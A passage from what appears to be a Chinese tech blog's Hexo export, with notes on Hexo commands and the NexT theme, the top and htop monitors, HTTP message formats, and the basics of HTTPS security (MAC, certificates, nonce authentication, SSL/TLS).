<h3 id="启动服务预览"><a href="#启动服务预览" class="headerlink" title="启动服务预览"></a>启动服务预览</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo s</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>默认情况下，访问网址为：<a href="http://localhost:4000/">http://localhost:4000/</a> 。</p>
<h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">hexo generate</span><br></pre></td></tr></table></figure>

<h3 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo d</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<h3 id="清除缓存文件（db-json）和已生成的静态文件（public-）"><a href="#清除缓存文件（db-json）和已生成的静态文件（public-）" class="headerlink" title="清除缓存文件（db.json）和已生成的静态文件（public/）"></a>清除缓存文件（<code>db.json</code>）和已生成的静态文件（<code>public/</code>）</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>Hexo 生成的网站目录结构如下：</p>
<ul>
<li><code>public/</code>：此目录下保存着已经生成的静态文件</li>
<li><code>scaffolds/</code>：此目录下存放 Hexo 模板，当您新建文章时，Hexo 会根据 scaffold 来建立文件。</li>
<li><code>source/</code>：此目录下存放用户资源<ul>
<li><code>_posts/</code>：此目录下存放 Markdown 格式的源文章</li>
<li><code>images/</code>：此目录下存放相关图片文件</li>
</ul>
</li>
<li><code>themes/</code>：此目录下保存着主题文件</li>
<li><code>_config.yml</code>：此文件为<strong>站点配置文件</strong></li>
</ul>
<h3 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h3><p>站点配置文件（<code>_config.yml</code>）中的 <code>url</code> 字段务必要填写为自己站点的正确网址，否则分享自己站点内文章时会生成错误链接。</p>
<p>新建文章（<code>hexo n &lt;title&gt;</code>）时建议使用小写英文作为文件名，此文件名将作为文章链接的一部分，英文中的空格将自动用 <code>-</code> 替代，文章标题可以在文件中另行设置。</p>
<p>和传统的博客一样，建议开启<strong>分类</strong>（category）和<strong>标签</strong>（tag）功能，在 Hexo 中，分类具有<strong>顺序性</strong>和<strong>层次性</strong>，也就是说 <code>Foo，Bar</code> 不等于 <code>Bar，Foo</code>，而标签没有顺序和层次。简单来说，分类应该是经过深思熟虑的，而标签则可适文章而决定，分类一般只有几个，而标签可以有一堆。具体而言，可以参考本站点的分类标签设计。</p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Hexo 支持<a href="https://hexo.io/plugins/">许多插件</a>，个人经常使用的插件如下：</p>
<ul>
<li><a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a>：为 Hexo 打造的 Git 部署插件，适用于将博客部署到 GitHub 仓库上。</li>
<li><a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a>：适用于为博客添加 RSS 功能。</li>
<li><a href="https://github.com/hexojs/hexo-generator-sitemap">hexo-generator-sitemap</a>：适用于为博客添加 Sitemap 功能。</li>
<li><a href="https://github.com/theme-next/hexo-symbols-count-time">hexo-symbols-count-time</a>：适用于为文章添加字数统计和阅读时长统计，比同类型的 <a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a> 插件要更好。</li>
<li><a href="https://github.com/theme-next/hexo-generator-searchdb">hexo-generator-searchdb</a>：适用于为博客添加本地搜索功能。</li>
</ul>
<p>使用如下命令即可安装上面提到的所有插件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git hexo-generator-feed hexo-generator-sitemap hexo-symbols-count-time hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>安装 Hexo 后，默认使用的主题为 <a href="https://github.com/hexojs/hexo-theme-landscape">landscape</a>，个人不是很喜欢这个主题，所幸的是 Hexo 提供<a href="https://hexo.io/themes/">更多的第三方主题</a>，个人倾向于使用广为流行的 <a href="https://theme-next.js.org/">NexT 主题</a>。</p>
<p>值得注意的是，NexT 主题在 6.0.0 版本之前由 iissnan 个人维护，其官方仓库为 <a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a> ，官网为 <a href="https://theme-next.iissnan.com/">https://theme-next.iissnan.com/</a> ；在 6.0.0 版本之后由 theme-next 组织维护，其官方仓库更改为 <a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> ，官网为 <a href="https://theme-next.org/">https://theme-next.org</a> ；在 8.0.0 版本之后由 next-theme 组织维护，其官方仓库更改为 <a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a> ，官网为 <a href="https://theme-next.js.org/">https://theme-next.js.org/</a> ；这里所介绍的使用方法均以 8.0.0 版本之后为例。</p>
<h3 id="NexT-主题安装"><a href="#NexT-主题安装" class="headerlink" title="NexT 主题安装"></a>NexT 主题安装</h3><p>要安装 NexT 主题，首先要进入 Hexo 站点目录下，接着执行 <code>https://github.com/next-theme/hexo-theme-next themes/next</code> 命令，即可将 NexT 仓库克隆到本地。要启用 NexT 主题，只需在<strong>站点配置文件</strong>中找到 <code>theme</code> 字段，并将其值更改为 <code>next</code> 即可。</p>
<h3 id="NexT-主题更新"><a href="#NexT-主题更新" class="headerlink" title="NexT 主题更新"></a>NexT 主题更新</h3><p>要查看正在使用的 NexT 主题的版本，有如下几种方法：</p>
<ul>
<li>可直接打开<strong>主题配置文件</strong>（即站点目录下的 <code>/themes/next/_config.yml</code> 文件），在其底部 <code>version</code> 字段即可查看版本号。</li>
<li>在自己站点的底部一般会有 Hexo 和 NexT 的版本号</li>
</ul>
<p>和传统的 Git 仓库更新一样，进入站点目录下的 <code>/themes/next</code> 文件夹，执行 <code>git pull</code> 命令即可从官方仓库拉取最新代码进行更新。</p>
<p>如果你使用的是 6.0.0 之前的版本，现在想要升级到 6.0.0 之后的版本，可参考 theme-next 官方给出的<a href="https://github.com/theme-next/hexo-theme-next/blob/master/docs/zh-CN/UPDATE-FROM-5.1.X.md">解决方案</a>。</p>
<p>如果你使用的是 8.0.0 之前的版本，现在想要升级到 8.0.0 之后的版本，可参考 next-theme 官方给出的<a href="https://theme-next.js.org/docs/getting-started/upgrade.html#Upgrade">解决方案</a>。</p>
<h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p>关于 Hexo 的更多问题，请参考 <a href="https://hexo.io/zh-cn/docs/">Hexo 官方文档</a>，或 YouTube 上 <a href="https://www.youtube.com/watch?v=B0yVJ46CTR8&list=PLD5dyQmlN6xPqBV0cxO7zAe1C8OmDPqfX">Hexo 系列教程</a>视频；关于 NexT 主题的更多问题，请参考旧版的中文 <a href="https://theme-next.iissnan.com/">NexT 使用文档</a>；关于如何利用 Hexo 以及 GitHub Pages 搭建个人博客的更详细内容，请参考 <a href="https://zhuanlan.zhihu.com/p/26625249">GitHub + Hexo 搭建个人网站详细教程</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>top 的增强版：htop</title>
    <url>/2018/09/19/htop-top/</url>
    <content><![CDATA[<h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><p>top 是 Linux 下一个常用命令，用来监视系统的运行状况，类似于 Windows 的任务管理器，下图是 <code>top</code> 命令的运行界面：</p>
<p><img src="/images/top.PNG" alt="top"></p>
<p>top 的运行结果可以大致分为 7 个部分：</p>
<ul>
<li>第 1 行显示了<strong>系统</strong>概况</li>
<li>第 2 行显示了<strong>进程</strong>概况</li>
<li>第 3 行显示了 <strong>CPU</strong> 概况</li>
<li>第 4 行显示了<strong>内存</strong>概况</li>
<li>第 5 行显示了 <strong>Swap 分区</strong>概况</li>
<li>第 6 行为空行，用以显示运行命令时输入的<strong>参数</strong></li>
<li>剩下部分则为<strong>每个进程的详细信息</strong></li>
</ul>
<span id="more"></span>

<h3 id="第-1-行"><a href="#第-1-行" class="headerlink" title="第 1 行"></a>第 1 行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>top -</td>
<td>系统概况</td>
</tr>
<tr>
<td>18:37:24</td>
<td>当前系统时间</td>
</tr>
<tr>
<td>up 130 days, 6:22,</td>
<td>系统已运行时间</td>
</tr>
<tr>
<td>1 user,</td>
<td>当前登录用户数</td>
</tr>
<tr>
<td>load average: 0.02, 0.04, 0.00</td>
<td>系统平均负载，三个数值分别为 1 分钟、5 分钟、15 分钟前到现在的平均值。</td>
</tr>
</tbody></table>
<h3 id="第-2-行"><a href="#第-2-行" class="headerlink" title="第 2 行"></a>第 2 行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Tasks:</td>
<td>进程（任务）概况</td>
</tr>
<tr>
<td>23 total,</td>
<td>总进程数</td>
</tr>
<tr>
<td>1 running,</td>
<td>运行的进程数</td>
</tr>
<tr>
<td>22 sleeping,</td>
<td>睡眠的进程数</td>
</tr>
<tr>
<td>0 stopped,</td>
<td>停止的进程数</td>
</tr>
<tr>
<td>0 zombie</td>
<td>僵尸进程数</td>
</tr>
</tbody></table>
<h3 id="第-3-行"><a href="#第-3-行" class="headerlink" title="第 3 行"></a>第 3 行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Cpu(s):</td>
<td>CPU 概况</td>
</tr>
<tr>
<td>3.7%us,</td>
<td>用户（user）进程占用 CPU 百分率</td>
</tr>
<tr>
<td>0.7%sy,</td>
<td>系统（system）进程占用 CPU 百分率</td>
</tr>
<tr>
<td>0.0%ni,</td>
<td>用户进程空间内改变过优先级（niced）的进程占用 CPU 百分比</td>
</tr>
<tr>
<td>95.7%id,</td>
<td>CPU 空闲（idle）率</td>
</tr>
<tr>
<td>0.0%wa,</td>
<td>等待（wait）IO 的 CPU 时间百分比</td>
</tr>
<tr>
<td>0.0%hi,</td>
<td>硬中断（hardware interrupt）占用 CPU 的百分比</td>
</tr>
<tr>
<td>0.0%si,</td>
<td>软中断（software interrupt）占用 CPU 的百分比</td>
</tr>
<tr>
<td>0.0%st</td>
<td>todo</td>
</tr>
</tbody></table>
<h3 id="第-4-行"><a href="#第-4-行" class="headerlink" title="第 4 行"></a>第 4 行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Mem:</td>
<td>内存（memory）概况，数值以 kb 为单位</td>
</tr>
<tr>
<td>524288k total,</td>
<td>内存总量</td>
</tr>
<tr>
<td>278140k used,</td>
<td>内存使用量</td>
</tr>
<tr>
<td>246148k free,</td>
<td>内存空闲量</td>
</tr>
<tr>
<td>0k buffers</td>
<td>缓冲的内存量</td>
</tr>
</tbody></table>
<h3 id="第-5-行"><a href="#第-5-行" class="headerlink" title="第 5 行"></a>第 5 行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Swap:</td>
<td>Swap 分区概况，数值以 kb 为单位</td>
</tr>
<tr>
<td>65536k total,</td>
<td>Swap 分区总量</td>
</tr>
<tr>
<td>65536k used,</td>
<td>Swap 分区使用量</td>
</tr>
<tr>
<td>0k free,</td>
<td>Swap 分区空闲量</td>
</tr>
<tr>
<td>28800k cached</td>
<td>缓冲的 Swap 分区量</td>
</tr>
</tbody></table>
<h3 id="剩下部分"><a href="#剩下部分" class="headerlink" title="剩下部分"></a>剩下部分</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>PID</td>
<td>进程号</td>
</tr>
<tr>
<td>USER</td>
<td>进程创建者</td>
</tr>
<tr>
<td>PR</td>
<td>进程优先级</td>
</tr>
<tr>
<td>NI</td>
<td>nice 值。越小优先级越高，最小 -20，最大 20（用户设置最大 19）</td>
</tr>
<tr>
<td>VIRT</td>
<td>进程使用的虚拟（virtual）内存总量，单位 kb。VIRT=SWAP+RES</td>
</tr>
<tr>
<td>RES</td>
<td>进程使用的、未被换出的物理内存大小，单位 kb。RES=CODE+DATA</td>
</tr>
<tr>
<td>SHR</td>
<td>共享（share）内存大小，单位 kb</td>
</tr>
<tr>
<td>S</td>
<td>进程状态。D=不可中断的睡眠状态，R=运行态，S=睡眠态，T=跟踪/停止态，Z=僵尸态</td>
</tr>
<tr>
<td>%CPU</td>
<td>进程占用 CPU 百分比</td>
</tr>
<tr>
<td>%MEM</td>
<td>进程占用内存百分比</td>
</tr>
<tr>
<td>TIME+</td>
<td>进程运行时间</td>
</tr>
<tr>
<td>COMMAND</td>
<td>运行进程时所使用的命令</td>
</tr>
</tbody></table>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>在 <code>top</code> 命令运行界面也可以输入相关命令，具体如下：</p>
<ul>
<li><code>q</code>：退出 <code>top</code> 运行界面</li>
<li><code>P</code>：以占据 CPU 百分比排序</li>
<li><code>M</code>：以占据内存百分比排序</li>
<li><code>T</code>：以累积占用 CPU 时间排序</li>
<li><code>s</code>：修改刷新时间间隔，默认每隔 3 秒刷新信息。按下 s 键，然后按下数字，即可修改刷新时间间隔为你输入的数字，单位为秒。例如：按下 s 键，在按数字 1 键，即可实现每秒刷新一次</li>
<li>回车或空格：手动立即刷新</li>
<li><code>k</code>：终止指定的进程。按下 k 键，再输入要杀死的进程的 pid，再按回车键，选择信号类型，以数字标示，默认 15 为杀死，本步可省略直接按回车键（常用为 -9）</li>
<li><code>h</code>：显示可输入的命令帮助菜单</li>
</ul>
<h2 id="htop"><a href="#htop" class="headerlink" title="htop"></a>htop</h2><p>htop 是一款第三方的命令行工具，它可以被视为是 top 的增强版，在 Ubuntu 下可使用 <code>apt install htop</code> 命令安装，下图是 <code>htop</code> 命令的运行界面：</p>
<p><img src="/images/htop.PNG" alt="htop"></p>
<p>当了解了 <code>top</code> 运行界面的各种参数的含义后，<code>htop</code> 运行界面就变得不言而喻了，下面简要介绍一下可以在 htop 运行界面执行的相关命令：</p>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>综上所述，htop 相比 top 有以下优势：</p>
<ul>
<li>彩色标识 CPU、内存、Swap 分区</li>
<li>CPU、内存、Swap 分区使用情况直观易懂</li>
<li>底部有命令提示</li>
<li>支持方向键选择进程</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP 协议分析</title>
    <url>/2018/05/11/http/</url>
    <content><![CDATA[<p><strong>HTTP</strong>，全称 Hypertext Transfer Protocol，即<strong>超文本传输协议</strong>。HTTP 定义了 Web 客户向 Web 服务请求 Web 页面的方式，以及服务器向客户传送 Web 页面的方式。HTTP 使用 TCP 作为它的支撑运输协议。</p>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>在详细解释 HTTP 之前，应当回顾某些 Web 术语。</p>
<p><strong>Web 页面</strong>（Web page）（也叫文档）是由对象组成的。一个<strong>对象</strong>（object）只是一个文件，诸如一个 HTML 文件、一个 JPEG 图形、一个 Java 小程序或一个视频片段这样的文件，且它们可通过一个 URL 地址寻址。多数 Web 页面含有一个 <strong>HTML 基本文件</strong>（base HTML file）以及几个引用对象。HTML 基本文件通过对象的 URL 地址引用页面中的其他对象。每个 URL 地址由两部分组成：存放对象的服务器主机名和对象的路径名。</p>
<p>因为 <strong>Web 浏览器</strong>（Web browser）（例如 Chrome 和 Firefox）实现了 HTTP 的客户端，所以在 Web 环境中我们经常交替使用“浏览器”和“客户”这两个术语。<strong>Web 服务器</strong>（Web server）实现了 HTTP 的服务器端，它用于存储 Web 对象，每个对象由 URL 寻址。流行的 Web 服务器有 Apache 和 Nginx。</p>
<span id="more"></span>

<h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><p>HTTP 规范包含了对 HTTP 报文格式的定义。HTTP 报文有两种：请求报文和响应报文。</p>
<h3 id="HTTP-请求报文"><a href="#HTTP-请求报文" class="headerlink" title="HTTP 请求报文"></a>HTTP 请求报文</h3><p>一个典型的示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /somedir/page.html HTTP/1.1</span><br><span class="line">Host: www.someschool.edu</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept-Language: fr</span><br></pre></td></tr></table></figure>

<p>HTTP 请求报文的第一行叫做<strong>请求行</strong>（request line），其后继的行叫做<strong>首部行</strong>（header line）。</p>
<p>请求行有 3 个字段：方法字段、URL 字段和 HTTP 版本字段。方法字段可以取几种不同的值，包括 <strong>GET</strong>、<strong>POST</strong>、<strong>HEAD</strong>、<strong>PUT</strong> 和 <strong>DELETE</strong>。绝大部分的 HTTP 请求报文使用 GET 方法。</p>
<p><strong>Host</strong> 首部行指明对象所在的主机，该信息是 Web 代理高速缓存所要求的；<strong>Connection</strong> 首部行指明采用非持续连接还是持续连接；<strong>User-Agent</strong> 首部行指明用户代理；<strong>Accept-Language</strong> 首部行指明用户想得到的语言版本。</p>
<p>以下是请求报文的通用格式：</p>
<p><img src="/images/http-request.PNG" alt="http request"></p>
<p>使用 GET 方法时实体体（entity body）为空，而使用 POST 方法时才使用该实体体。</p>
<p>HEAD 方法类似于 GET 方法。当服务器收到使用 HEAD 方法的请求时，将会用一个 HTTP 报文进行响应，但是并不返回请求对象。应用程序开发者常用 HEAD 方法进行调试跟踪。PUT 方法常与 Web 发行工具联合使用，它运行用户上传对象到指定的 Web 服务器上指定的路径（目录）。PUT 方法也被那些需要向 Web 服务器上传对象的应用程序使用。DELETE 方法允许用户或者应用程序删除 Web 服务器上的对象。</p>
<h3 id="HTTP-响应报文"><a href="#HTTP-响应报文" class="headerlink" title="HTTP 响应报文"></a>HTTP 响应报文</h3><p>一个典型的示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Tue, 18 Aug 2015 15:44:04 GMT</span><br><span class="line">Server: Apache/2.2.3 (CentOS)</span><br><span class="line">Last-Modified: Tue, 18 Aug 2015 15:11:03 GMT</span><br><span class="line">Content-Length: 6821</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">(data data data data data ...)</span><br></pre></td></tr></table></figure>

<p>上述响应报文有三个部分：一个初始<strong>状态行</strong>（status line），6 个<strong>首部行</strong>（header line），然后是<strong>实体体</strong>（entity body）。</p>
<p>实体体部分是报文的主要部分，即它包含了所请求的对象本身。状态行有 3 个字段：协议版本字段、状态码和相应状态信息。</p>
<p><strong>Date</strong> 首部行指示服务器<strong>产生并发送</strong>该响应报文的日期和时间；<strong>Server</strong> 首部行指示服务器类型，类似于 User-Agent 首部行；<strong>Last-Modified</strong> 首部行指示了对象创建或者最后修改的日期和时间，该信息对 Web 缓存至关重要；<strong>Content-Length</strong> 首部行指示了被发送对象中的字节数；<strong>Content-Type</strong> 首部行指示了实体体中的对象的 MIME 类型。</p>
<p>以下是响应报文的通用格式：</p>
<p><img src="/images/http-response.PNG" alt="http response"></p>
<p>常见的状态码和其对应的短语：</p>
<ul>
<li>200 OK：请求成功，信息在返回的响应报文中。</li>
<li>301 Moved Permanently：请求的对象已经被 <strong>永久</strong> 转移了，新的 URL 定义在响应报文的 Location 首部行中。客户软件将自动获取新的 URL。</li>
<li>302 Moved Temporarily：请求的对象已经被 <strong>暂时</strong> 转移了，新的 URL 定义在响应报文的 Location 首部行中。客户软件将自动获取新的 URL。</li>
<li>400 Bad Request：一个通用差错代码，指示该请求不能被服务器理解。</li>
<li>403 Forbidden：客户端没有权限访问此资源。</li>
<li>404 Not Found：被请求的文档不在服务器上。</li>
<li>503 Service Unavailable：服务器尚未处于可以接受请求的状态。</li>
<li>505 HTTP Version Not Supported：服务器不支持请求报文使用的 HTTP 协议版本。</li>
</ul>
<p>一般而言，200 系列代表正常，300 系列代表重定向，400 系列代表客户端错误，500 系列代表服务端错误。</p>
<h2 id="Web-缓存"><a href="#Web-缓存" class="headerlink" title="Web 缓存"></a>Web 缓存</h2><p><strong>Web 缓存器</strong>（Web cache）也叫<strong>代理服务器</strong>（proxy server），它是能够代表初始 Web 服务器来满足 HTTP 请求的网络实体。Web 缓存器有自己的磁盘存储空间，并在存储空间中保存最近请求过的对象的副本。</p>
<p>值得注意的是 Web 缓存器即是服务器又是客户。当它接收浏览器的请求并发回响应时，它是一个服务器。当它向初始服务器发出请求并接收响应时，它是一个客户。</p>
<p>Web 缓存器通常由 ISP 购买并安装。实践中的<strong>命中率</strong>（即由一个缓存器所满足的请求的比率）通常在 <strong>0.2 ~ 0.7</strong> 之间。</p>
<p>在因特网上部署 Web 缓存器有两个原因：</p>
<ul>
<li>Web 缓存器可以大大减少对客户请求的响应时间</li>
<li>Web 缓存器能够大大减少一个机构的接入链路到因特网的通信量</li>
</ul>
<p><strong>条件 GET（conditional GET）方法</strong>：请求报文使用 GET 方法，并且请求报文中包含一个 <strong>If-Modified-Since</strong> 首部行。</p>
<p>Web 缓存器为了验证所缓存的对象是否是最新的，会使用条件 GET 方法向目标服务器发送一个请求报文，If-Modified-Since 首部行的值为当初缓存对象时响应报文中 Last-Modified 首部行的值。如果所要验证的对象是最新的，即没有被修改过，则目标服务器会返回一个“<strong>304 Not Modified</strong>”响应报文，其中实体体为空。</p>
<p>通过使用 CDN（Content Distribution Network，内容分发网络），Web 缓存器正在因特网中发挥着越来越重要的作用。CDN 公司在因特网上安装了许多地理上分散的缓存器，因而使大量流量实现了本地化。</p>
<h2 id="非持续连接和持续连接"><a href="#非持续连接和持续连接" class="headerlink" title="非持续连接和持续连接"></a>非持续连接和持续连接</h2><p>HTTP 可以采用非持续连接或持续连接，默认采用持续连接。</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>目前多数大网站已经采用了 HTTP/2，还有一部分老旧网站仍然在使用 HTTP/1.1。</p>
<p>HTTP/2 相比 HTTP/1.1 做的最大的改动是使用了多路复用，即同一个域名、同一个 IP 下的多个文件会共用一个 TCP 连接进行合并传输。</p>
<p>HTTP/3 是未来的一个 HTTP 版本，它相比前两个版本，做的最大的改动是将弃用 TCP 协议，改为使用基于 UDP 协议的 QUIC 协议实现。</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>HTTP 是一个<strong>无状态协议</strong>（stateless protocol），即 HTTP 服务器并不保存关于客户的任何信息。但我们可以通过 cookie 机制实现有状态的访问。</p>
<p>有些文章将非持续连接翻译为 <em>短连接</em>，将持续连接翻译为 <em>长连接</em>，纵观 RFC 相关文档，找不到类似短连接或长连接这样的描述，因此，为保证严谨，个人推荐使用非持续连接或持续连接这样的描述。</p>
<p>有的文章还将 HTTP 描述为 <em>无连接</em>，它们可能本意指的是无状态或非持续连接？纵观上述，找不到这样描述的原因，不应该使用无连接描述 HTTP。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:64-75.</a></li>
<li><a href="https://tools.ietf.org/html/rfc2616">RFC 2616 - Hypertext Transfer Protocol -- HTTP/1.1</a></li>
<li><a href="https://tools.ietf.org/html/rfc7540">RFC 7540 - Hypertext Transfer Protocol Version 2 (HTTP/2)</a></li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS 运行机制</title>
    <url>/2018/05/11/https/</url>
    <content><![CDATA[<p>HTTPS 确保了客户和服务器之间通信的安全性，具体来说，这种安全性主要包括机密性、完整性和端点鉴别。</p>
<h2 id="信息安全三要素"><a href="#信息安全三要素" class="headerlink" title="信息安全三要素"></a>信息安全三要素</h2><p>信息安全三要素即<strong>机密性</strong>（Confidentiality）、<strong>完整性</strong>（Integrity）和<strong>可用性</strong>（Availability），简称 <strong>CIA</strong>。</p>
<ul>
<li>机密性：仅有发送方和希望的接收方能够理解传输报文的内容。因为窃听者可以截获报文，这必须要求报文在一定程度上进行 <strong>加密</strong>（encrypted），使截取的报文无法被截获者所理解。机密性的这个方面大概就是通常意义上对于术语 <em>信息安全</em> 的理解。</li>
<li>完整性：或称 <em>报文完整性</em> 或 <em>报文鉴别</em>，即通信双方希望确保其通信的内容在传输过程中未被改变 —— 或者恶意篡改或者意外改动。我们在可靠数据传输和数据链路协议中遇到的 <em>检验和</em> 技术在扩展后能够用于提供这种报文完整性。</li>
<li>可用性：指保证信息确实能为授权使用者所用，即保证合法用户在需要时可以使用所需信息。</li>
</ul>
<p>除了 CIA 之外，还有一点需要注意，即<strong>端点鉴别</strong>（end-point authentication），这是指发送方和接收方都应该能证实通信过程所涉及的另一方，以确信通信的另一方确实具有其所声称的身份。</p>
<span id="more"></span>

<h2 id="报文鉴别码"><a href="#报文鉴别码" class="headerlink" title="报文鉴别码"></a>报文鉴别码</h2><p>通过报文鉴别码可以实现完整性，具体而言，A 和 B 需要共享秘密比特串 $s$，它被称为<strong>鉴别密钥</strong>（authentication key）。使用这个共享秘密，报文完整性能够执行如下：</p>
<ol>
<li>A 生成报文 $m$，用 $s$ 级联 $m$ 以生成 $m+s$，并计算哈希 $H(m+s)$（例如使用 SHA-1）。$H(m+s)$ 被称为<strong>报文鉴别码</strong>（Message Authentication Code，<strong>MAC</strong>）。</li>
<li>然后 A 将 MAC 附加到报文 $m$ 上，生成扩展报文 $(m, H(m+s))$，并将该扩展报文发送给 B。</li>
<li>B 接收到一个扩展报文 $(m, h)$，由于知道 $s$，计算出报文鉴别码 $H(m+s)$。若 $H(m+s)=h$，则一切正常。</li>
</ol>
<p>MAC 的一个优良特点是它不要求一种加密算法，多年来已经提出了若干种对 MAC 的不同标准，目前最为流行的标准是 HMAC，它能够与 MD5 或 SHA-1 一道使用。</p>
<p>其实使用数字签名也可以实现完整性，同时也验证了该报文的源（注意 MAC 并不能做到这一点）。具体使用 MAC 还是数字签名实现完整性，在不同的协议里有不同的选择，如 PGP 使用数字签名，而 OSPF 和 SSL 使用 MAC。</p>
<p>在生成 MAC 过程中既不涉及公开密钥加密，也不涉及对称密钥加密。而在生成数字签名的过程中涉及到了公开密钥加密，因此，数字签名是一种“技术含量更高”的技术，因为它需要一个如后面描述的、具有认证中心支撑的公钥基础设施（PKI）。</p>
<h2 id="公钥认证"><a href="#公钥认证" class="headerlink" title="公钥认证"></a>公钥认证</h2><p><strong>公钥认证</strong>（public key certification）即证实一个公钥属于某个特定的实体。将公钥与特定实体绑定通常是由<strong>认证中心</strong>（Certification Authority，<strong>CA</strong>）完成的，CA 的职责就是使识别和发行证书合法化。CA 具有下列作用：</p>
<ul>
<li>CA 证实一个实体（一个人、一台路由器等）的真实身份。</li>
<li>一旦 CA 验证了某个实体的身份，这个 CA 会生成一个将其身份和实体的公钥绑定起来的<strong>证书</strong>（certificate）。这个证书包含这个公钥和公钥所有者全局唯一的身份标识信息（例如，一个人的名字或一个 IP 地址）。由 CA 对这个证书进行数字签名。</li>
</ul>
<h2 id="端点鉴别"><a href="#端点鉴别" class="headerlink" title="端点鉴别"></a>端点鉴别</h2><p>鉴别应当在报文和数据交换的基础上，作为某 <strong>鉴别协议</strong>（authentication protocol）的一部分独立完成。鉴别协议通常在两个通信实体运行其他协议 <em>之前</em> 运行。鉴别协议首先建立相互满意的各方标识；仅当鉴别完成之后，各方才继续下面的工作。</p>
<p>一个实际可行的鉴别协议会使用到 <em>对称密钥</em> 和 <em>不重数</em>，<strong>不重数</strong>（nonce）是在一个协议的生存期中只使用一次的数，也就是说，一旦某协议使用了一个不重数，就永远不会再使用那个数字了。具体过程如下所示：</p>
<ol>
<li>A 向 B 发送报文“我是 A”</li>
<li>B 选择一个不重数 $R$，然后把这个值发送给 A</li>
<li>A 使用它与 B 共享的对称密钥 $K_{A-B}$ 来加密这个不重数，然后把加密的不重数 $K_{A-B}(R)$ 发回给 B。</li>
<li>B 解密接收到的报文。若解密得到的不重数等于它发送给 A 的那个不重数，则可鉴别 A 的身份。</li>
</ol>
<p>使用对称密钥确保了鉴别的双方，而使用不重数则预防了<strong>回放攻击</strong>（playback attack）。</p>
<p>对于 HTTPS 而言，端点鉴别具体分为：<em>服务器鉴别</em> 和 <em>客户鉴别</em>。服务器鉴别是为了防止站点假冒（这可以通过 CA 证书来验证），客户鉴别是为了防御连接重放。</p>
<h2 id="SSL-与-TLS"><a href="#SSL-与-TLS" class="headerlink" title="SSL 与 TLS"></a>SSL 与 TLS</h2><p>SSL（Secure Socket Layer，<strong>安全套接字层</strong>）最初由 Netscape 设计，其发展到现在存在一些设计上的漏洞，SSL 版本 3 的一个稍加修改的版本被称为 TLS（Transport Layer Security，<strong>传输层安全性</strong>）。</p>
<p>现在为了安全性基本都采用 TLS，本文以下内容采用 SSL 来指代最新的 TLS。</p>
